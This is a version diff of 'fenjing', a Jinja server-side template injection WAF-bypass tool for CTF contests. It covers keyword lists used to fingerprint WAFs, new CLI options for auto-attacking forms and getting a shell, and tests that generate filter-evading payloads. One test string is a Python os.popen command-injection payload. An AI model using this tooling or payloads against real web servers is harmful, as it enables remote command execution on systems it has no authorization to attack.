+            self.used_count[gen.__name__] += 1
             return ret
 
         logger.warning(
             "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                 failed=colored("red", "failed"),
                 gen_type=gen_type,
                 args_repl=", ".join(repr(arg) for arg in args),
```

### Comparing `fenjing-0.4.4/fenjing/requester.py` & `fenjing-0.4.5/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/scan_url.py` & `fenjing-0.4.5/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/shell_payload.py` & `fenjing-0.4.5/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/templates/index.html` & `fenjing-0.4.5/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/waf_func_gen.py` & `fenjing-0.4.5/fenjing/waf_func_gen.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,103 +1,104 @@
 """根据指定的表单生成对应的WAF函数
 
 """
 
 from collections import Counter, namedtuple
 from functools import lru_cache
 import logging
-from typing import Dict, Callable, Any, Union
+from typing import Dict, Callable, Union
 import random
 import string
 
 from .const import (
     CALLBACK_SUBMIT,
-    WAF_PAGE_SAMPLE_MODE_FAST,
-    WAF_PAGE_SAMPLE_MODE_FULL,
+    DETECT_MODE_ACCURATE,
 )
-from .form import fill_form
+from .form import fill_form, Form
 from .requester import Requester
 from .colorize import colored
 
 
 logger = logging.getLogger("waf_func_gen")
 Result = namedtuple("Result", "payload_generate_func input_field")
 
+dangerous_keywords = [
+    '"',
+    "'",
+    "+",
+    ".",
+    "0",
+    "1",
+    "2",
+    "=",
+    "[",
+    "_",
+    "%",
+    "attr",
+    "builtins",
+    "chr",
+    "class",
+    "config",
+    "eval",
+    "global",
+    "include",
+    "lipsum",
+    "mro",
+    "namespace",
+    "open",
+    "pop",
+    "popen",
+    "read",
+    "request",
+    "self",
+    "subprocess",
+    "system",
+    "url_for",
+    "value",
+    "{{",
+    "|",
+    "}}",
+    "~",
+]
+
+random.shuffle(dangerous_keywords)
+
 
 class WafFuncGen:
     """
     根据指定的表单生成对应的WAF函数
     """
 
-    dangerous_keywords = [
-        '"',
-        "'",
-        "+",
-        ".",
-        "0",
-        "1",
-        "2",
-        "=",
-        "[",
-        "_",
-        "%",
-        "attr",
-        "builtins",
-        "chr",
-        "class",
-        "config",
-        "eval",
-        "global",
-        "include",
-        "lipsum",
-        "mro",
-        "namespace",
-        "open",
-        "pop",
-        "popen",
-        "read",
-        "request",
-        "self",
-        "subprocess",
-        "system",
-        "url_for",
-        "value",
-        "{{",
-        "|",
-        "}}",
-        "~",
-    ]
-
     def __init__(
         self,
         url: str,
-        form: Dict[str, Any],
+        form: Form,
         requester: Requester,
         callback: Union[Callable[[str, Dict], None], None] = None,
-        waf_page_sample_mode: str = WAF_PAGE_SAMPLE_MODE_FAST,
+        detect_mode: str = DETECT_MODE_ACCURATE,
     ):
         """根据指定的表单生成对应的WAF函数
 
         Args:
             url (str): form所在的url.
             form (dict): 解析后的form元素
             requester (Requester): 用于发出请求的requester，为None时自动构造.
             callback (Union[Callable[[str, Dict], None], None], optional):
                 callback函数，默认为None
-            waf_page_sample_mode (str): 测试WAF页面hash的模式
+            detect_mode (str): 测试WAF页面hash的模式
                 "fast": 一次发送多个危险的关键字
-                "full": 一次发送一个危险的关键字
+                "accurate": 一次发送一个危险的关键字
         """
         self.url = url
         self.form = form
         self.req = requester
         self.callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
-        self.waf_page_sample_mode = waf_page_sample_mode
+        self.detect_mode = detect_mode
 
     def submit(self, inputs: dict):
         """根据inputs提交form
 
         Args:
             inputs (dict): 需要提交的input
 
@@ -131,27 +132,27 @@
             input_field (str): 需要测试的input
 
         Returns:
             List[int]: payload被waf后页面对应的hash
         """
         resps = {}
         test_keywords = (
-            self.dangerous_keywords
-            if self.waf_page_sample_mode == WAF_PAGE_SAMPLE_MODE_FULL
+            dangerous_keywords
+            if self.detect_mode == DETECT_MODE_ACCURATE
             else [
-                "".join(self.dangerous_keywords[i:i+4])
-                for i in range(0, len(self.dangerous_keywords), 4)
+                "".join(dangerous_keywords[i: i + 3])  # flake8: noqa
+                for i in range(0, len(dangerous_keywords), 3)
             ]
         )
         for keyword in test_keywords:
             logger.info(
                 "Testing dangerous keyword %s",
-                colored("yellow", repr(keyword * 3)),
+                colored("yellow", repr(keyword * 2)),
             )
-            resps[keyword] = self.submit({input_field: keyword * 3})
+            resps[keyword] = self.submit({input_field: keyword * 2})
         hashes = [
             hash(r.text)
             for keyword, r in resps.items()
             if r is not None
             and r.status_code != 500
             and keyword not in r.text
         ]
```

### Comparing `fenjing-0.4.4/fenjing/webui.py` & `fenjing-0.4.5/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.5/README.md`

 * *Files 22% similar despite different names*

```diff
@@ -1,20 +1,7 @@
-Metadata-Version: 2.1
-Name: fenjing
-Version: 0.4.4
-Summary: A Jinja SSTI cracker for CTF competitions
-Home-page: https://github.com/Marven11/Fenjing
-Author: Marven11
-Author-email: marven11@example.com
-Classifier: Programming Language :: Python :: 3.7
-Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
-Classifier: Operating System :: OS Independent
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。
 
 ## 演示
@@ -22,14 +9,15 @@
 ![demo](assets/demo.webp)
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
+- 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -140,45 +128,58 @@
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
+  扫描指定的网站
+
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
+  攻击指定的表单
+
 Options:
   -u, --url TEXT       form所在的URL
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
 Options:
-  -u, --url TEXT     form所在的URL
-  -a, --action TEXT  form的action，默认为当前路径
-  -m, --method TEXT  form的提交方式，默认为POST
-  -i, --inputs TEXT  form的参数，以逗号分隔
-  --interval FLOAT   每次请求的间隔
-  --user-agent TEXT  请求时使用的User Agent
-  --help             Show this message and exit.
+  -u, --url TEXT      form所在的URL
+  -a, --action TEXT   form的action，默认为当前路径
+  -m, --method TEXT   form的提交方式，默认为POST
+  -i, --inputs TEXT   form的参数，以逗号分隔
+  --interval FLOAT    每次请求的间隔
+  --detect-mode TEXT  分析模式，可为accurate或fast
+  --user-agent TEXT   请求时使用的User Agent
+  --header TEXT       请求时使用的Headers
+  --cookies TEXT      请求时使用的Cookie
+  --help              Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
```

### Comparing `fenjing-0.4.4/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.5/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/setup.py` & `fenjing-0.4.5/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/tests/test_full_payload_gen.py` & `fenjing-0.4.5/tests/test_full_payload_gen.py`

 * *Files 22% similar despite different names*

```diff
@@ -10,62 +10,107 @@
 import random
 
 fenjing.full_payload_gen.logger.setLevel(logging.ERROR)
 fenjing.payload_gen.logger.setLevel(logging.ERROR)
 logging.basicConfig(level=logging.INFO)
 
 
-def get_full_payload_gen(blacklist):
-    return FullPayloadGen(lambda x: all(word not in x for word in blacklist))
+def get_full_payload_gen(
+    blacklist, detect_mode=fenjing.const.DETECT_MODE_ACCURATE
+):
+    return FullPayloadGen(
+        lambda x: all(word not in x for word in blacklist),
+        detect_mode=detect_mode,
+    )
 
 
-class FullPayloadGenTestCaseHard(unittest.TestCase):
+class FullPayloadGenTestCaseSimple(unittest.TestCase):
     def setUp(self) -> None:
         super().setUp()
-        self.full_payload_gen = get_full_payload_gen(
-            [
-                "config",
-                "self",
-                "g",
-                "os",
-                "class",
-                "length",
-                "mro",
-                "base",
-                "lipsum",
-                "[",
-                '"',
-                "'",
-                "_",
-                ".",
-                "+",
-                "~",
-                "{{",
-                "0",
-                "1",
-                "2",
-                "3",
-                "4",
-                "5",
-                "6",
-                "7",
-                "8",
-                "9",
-                "０",
-                "１",
-                "２",
-                "３",
-                "４",
-                "５",
-                "６",
-                "７",
-                "８",
-                "９",
-            ]
+        self.blacklist = [
+            "[",
+            "]",
+        ]
+        self.full_payload_gen = get_full_payload_gen(self.blacklist)
+
+    def test_string(self):
+        strings = [
+            "123",
+            "asdf",
+            "__dunder__",
+            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
+        ]
+        for string in strings:
+            payload, _ = self.full_payload_gen.generate(const.STRING, string)
+            # self.assertIsNotNone(payload)
+            assert payload is not None
+            # why?
+            # cause the stupid type checker thinks the 'payload' below would still be None
+            result = jinja2.Template(payload).render()
+            self.assertIn(string, result)
+            for word in self.blacklist:
+                self.assertNotIn(word, payload)
+
+    def test_os_popen_read(self):
+        payload, _ = self.full_payload_gen.generate(
+            const.OS_POPEN_READ, "echo fen  jing;"
         )
+        # self.assertIsNotNone(payload)
+        assert payload is not None
+        # why?
+        # cause the stupid type checker thinks the 'payload' below would still be None
+        result = jinja2.Template(payload).render()
+        self.assertIn("fen jing", result)
+        for word in self.blacklist:
+            self.assertNotIn(word, payload)
+
+
+class FullPayloadGenTestCaseHard(unittest.TestCase):
+    def setUp(self) -> None:
+        super().setUp()
+        self.blacklist = [
+            "config",
+            "self",
+            "g",
+            "os",
+            "class",
+            "length",
+            "mro",
+            "base",
+            "lipsum",
+            "[",
+            '"',
+            "'",
+            "_",
+            ".",
+            "+",
+            "~",
+            "{{",
+            "0",
+            "1",
+            "2",
+            "3",
+            "4",
+            "5",
+            "6",
+            "7",
+            "8",
+            "9",
+            "０",
+            "１",
+            "２",
+            "３",
+            "４",
+            "５",
+            "６",
+            "７",
+            "８",
+            "９",
+        ]
+        self.full_payload_gen = get_full_payload_gen(self.blacklist)
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
             "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
@@ -74,70 +119,73 @@
             payload, _ = self.full_payload_gen.generate(const.STRING, string)
             # self.assertIsNotNone(payload)
             assert payload is not None
             # why?
             # cause the stupid type checker thinks the 'payload' below would still be None
             result = jinja2.Template(payload).render()
             self.assertIn(string, result)
+            for word in self.blacklist:
+                self.assertNotIn(word, payload)
 
     def test_os_popen_read(self):
         payload, _ = self.full_payload_gen.generate(
             const.OS_POPEN_READ, "echo fen  jing;"
         )
         # self.assertIsNotNone(payload)
         assert payload is not None
         # why?
         # cause the stupid type checker thinks the 'payload' below would still be None
         result = jinja2.Template(payload).render()
         self.assertIn("fen jing", result)
+        for word in self.blacklist:
+            self.assertNotIn(word, payload)
 
 
 class FullPayloadGenTestCaseHard2(unittest.TestCase):
     def setUp(self) -> None:
         super().setUp()
-        self.full_payload_gen = get_full_payload_gen(
-            [
-                "_",
-                "'",
-                '"',
-                ".",
-                "system",
-                "os",
-                "eval",
-                "exec",
-                "popen",
-                "subprocess",
-                "posix",
-                "builtins",
-                "namespace",
-                "open",
-                "read",
-                "\\",
-                "self",
-                "mro",
-                "base",
-                "global",
-                "init",
-                "/",
-                "00",
-                "chr",
-                "value",
-                "get",
-                "url",
-                "pop",
-                "import",
-                "include",
-                "request",
-                "{{",
-                "}}",
-                '"',
-                "config",
-                "=",
-            ]
-        )
+        self.blacklist = [
+            "_",
+            "'",
+            '"',
+            ".",
+            "system",
+            "os",
+            "eval",
+            "exec",
+            "popen",
+            "subprocess",
+            "posix",
+            "builtins",
+            "namespace",
+            "open",
+            "read",
+            "\\",
+            "self",
+            "mro",
+            "base",
+            "global",
+            "init",
+            "/",
+            "00",
+            "chr",
+            "value",
+            "get",
+            "url",
+            "pop",
+            "import",
+            "include",
+            "request",
+            "{{",
+            "}}",
+            '"',
+            "config",
+            "=",
+        ]
+        self.full_payload_gen = get_full_payload_gen(self.blacklist)
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
             "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
@@ -146,97 +194,116 @@
             payload, _ = self.full_payload_gen.generate(const.STRING, string)
             # self.assertIsNotNone(payload)
             assert payload is not None
             # why?
             # cause the stupid type checker thinks the 'payload' below would still be None
             result = jinja2.Template(payload).render()
             self.assertIn(string, result)
+            for word in self.blacklist:
+                self.assertNotIn(word, payload)
 
     def test_os_popen_read(self):
         payload, _ = self.full_payload_gen.generate(
             const.OS_POPEN_READ, "echo fen  jing;"
         )
         # self.assertIsNotNone(payload)
         assert payload is not None
         # why?
         # cause the stupid type checker thinks the 'payload' below would still be None
         result = jinja2.Template(payload).render()
         self.assertIn("fen jing", result)
 
+        for word in self.blacklist:
+            self.assertNotIn(word, payload)
+
 
 class FullPayloadGenTestCaseRandom(unittest.TestCase):
     def setUp(self) -> None:
         super().setUp()
+        self.blacklists = [
+            random.sample(
+                [
+                    "config",
+                    "self",
+                    "g",
+                    "os",
+                    "class",
+                    "length",
+                    "mro",
+                    "base",
+                    "lipsum",
+                    "[",
+                    '"',
+                    "'",
+                    "_",
+                    ".",
+                    "+",
+                    "~",
+                    "{{",
+                    "0",
+                    "1",
+                    "2",
+                    "3",
+                    "4",
+                    "5",
+                    "6",
+                    "7",
+                    "8",
+                    "9",
+                    "０",
+                    "１",
+                    "２",
+                    "３",
+                    "４",
+                    "５",
+                    "６",
+                    "７",
+                    "８",
+                    "９",
+                ],
+                k=25,
+            )
+            for _ in range(50)
+        ]
         self.full_payload_gens = [
             get_full_payload_gen(
-                random.sample(
+                blacklist,
+                detect_mode=random.choice(
                     [
-                        "config",
-                        "self",
-                        "g",
-                        "os",
-                        "class",
-                        "length",
-                        "mro",
-                        "base",
-                        "lipsum",
-                        "[",
-                        '"',
-                        "'",
-                        "_",
-                        ".",
-                        "+",
-                        "~",
-                        "{{",
-                        "0",
-                        "1",
-                        "2",
-                        "3",
-                        "4",
-                        "5",
-                        "6",
-                        "7",
-                        "8",
-                        "9",
-                        "０",
-                        "１",
-                        "２",
-                        "３",
-                        "４",
-                        "５",
-                        "６",
-                        "７",
-                        "８",
-                        "９",
-                    ],
-                    k=25,
-                )
+                        fenjing.const.DETECT_MODE_ACCURATE,
+                        fenjing.const.DETECT_MODE_FAST,
+                    ]
+                ),
             )
-            for _ in range(50)
+            for blacklist in self.blacklists
         ]
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
             "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
         ]
-        for g in self.full_payload_gens:
+        for g, blacklist in zip(self.full_payload_gens, self.blacklists):
             for string in strings:
                 payload, _ = g.generate(const.STRING, string)
                 # self.assertIsNotNone(payload)
                 assert payload is not None
                 # why?
                 # cause the stupid type checker thinks the 'payload' below would still be None
                 result = jinja2.Template(payload).render()
                 self.assertIn(string, result)
+                for word in blacklist:
+                    self.assertNotIn(word, payload)
 
     def test_os_popen_read(self):
-        for g in self.full_payload_gens:
+        for g, blacklist in zip(self.full_payload_gens, self.blacklists):
             payload, _ = g.generate(const.OS_POPEN_READ, "echo fen  jing;")
             # self.assertIsNotNone(payload)
             assert payload is not None
             # why?
             # cause the stupid type checker thinks the 'payload' below would still be None
             result = jinja2.Template(payload).render()
             self.assertIn("fen jing", result)
+            for word in blacklist:
+                self.assertNotIn(word, payload)
```

### Comparing `fenjing-0.4.4/tests/test_payload_gen.py` & `fenjing-0.4.5/tests/test_payload_gen.py`

 * *Files identical despite different names*

